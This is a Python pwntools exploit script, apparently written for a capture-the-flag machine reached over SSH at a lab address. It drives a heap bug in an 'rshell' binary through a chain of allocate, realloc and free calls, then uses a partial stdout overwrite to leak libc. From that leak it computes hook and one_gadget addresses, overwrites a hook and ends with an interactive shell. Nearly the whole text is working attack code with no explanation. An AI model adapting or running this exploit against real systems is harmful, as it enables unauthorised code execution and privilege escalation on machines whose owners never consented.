from pwn import *

from time import sleep
period = 0.05

def allocate(filename, size, data, flag=0):
	p.sendline("add " + filename)
	sleep(period)
	p.recv(8000)
	p.sendline(str(size))
	sleep(period)
	p.recv(8000)
	p.sendline(data)
	sleep(period)
	p.recv(8000)

def free(filename):
	p.sendline("rm " + filename)
	sleep(period)
	p.recv(8000)

def realloc(filename, size, data, flag=0):
	p.sendline("edit " + filename)
	sleep(period)
	p.recv(8000)
	p.sendline(str(size))
	sleep(period)
	p.recv(8000)
	if flag:
		p.send(data)
	else:
		p.sendline(data)
	sleep(period)
	p.recv(8000)


ENV = {"LD_PRELOAD":"./libc.so.6"}
s=ssh(user="chromeuser", host="10.10.10.196",keyfile="./rope") # ./rope private key

while True:
	try:
		#p = process("./new",env=ENV)
		p = s.process("/usr/bin/rshell")
		#data = int(open("/proc/" + str(p.pid) + "/maps").readlines()[9].split("-")[0],16)
		#print(hex(data))
		#if(data & 0xffff) == 0x6000:
		if True:
			print("FIRST")
			allocate("a", 0x68, "A")
			realloc("a", 0, "")
			realloc("a", 0x18, "A")
			free("a")
			allocate("a", 0x48, "B")
			realloc("a", 0, "")
			realloc("a", 0x48, "B"*0x10)
			free("a")
			allocate("a", 0x48, "C")
			allocate("b", 0x68, b"C"*0x18+p64(0x451))
			free("b")
			for i in range(9):
			    allocate("b", 0x58, "D")
			    realloc("b", 0x70, "D")
			    free("b")
			# free to unsorted bin
			#realloc("a",)
			print("SECOND")
			realloc("a", 0, "")
			# partial overwrite to stdout
			realloc("a", 0x38, b"\x60\xb7",1)
			allocate("b", 0x48, "E")
			realloc("b", 0x18, "E")
			free("b")
			realloc("a", 0x18, "E"*0x10)
			free("a")
			#p.interactive()
			#pause()
			print("LEAK!!!!!!")
			allocate("a", 0x48, p64(0xfbad1800)+p64(0)*2+b"leak:".rjust(8, b"\x00"))
			p.recvuntil("leak:", timeout=1)
			libc_base = u64(p.recv(8)) - 0x1da00a
			print(hex(libc_base))
			realloc_hook = libc_base + 0x00000000001e4c28
			free_hook = libc_base + 0x00000000001e75a8
			malloc_hook = libc_base + 0x00000000001e4c30
			target = libc_base + 0x1e40a8
			system = libc_base + 0x0000000000052fd0
			print(hex(free_hook))
			#print(hex(free_hook))
			allocate("b", 0x70, "F")
			realloc("b", 0, "")
			realloc("b", 0x18, "F"*0x10)
			sleep(0.5)
			free("b")
			# gdb.attach(io, "b menu")
			sleep(0.5)
			allocate("b", 0x70, b"F"*0x18+p64(0x61)+ p64(target))
			sleep(0.5)
			free("b")
			sleep(0.5)
			allocate("b", 0x58, "G")
			sleep(0.5)
			realloc("b", 0x28, "G")
			sleep(0.5)
			free("b")
			one_gadget = libc_base + 0xe237f
			print(hex(one_gadget))
			# gdb.attach(io, "b realloc")
			# allocate("b", 0x58, p64(libc_base+libc.sym["malloc"])+p64(libc_base+one_gadget))
			pause()
			allocate("b", 0x58, p64(one_gadget))
			p.interactive()
	except:
		p.close()
		continue
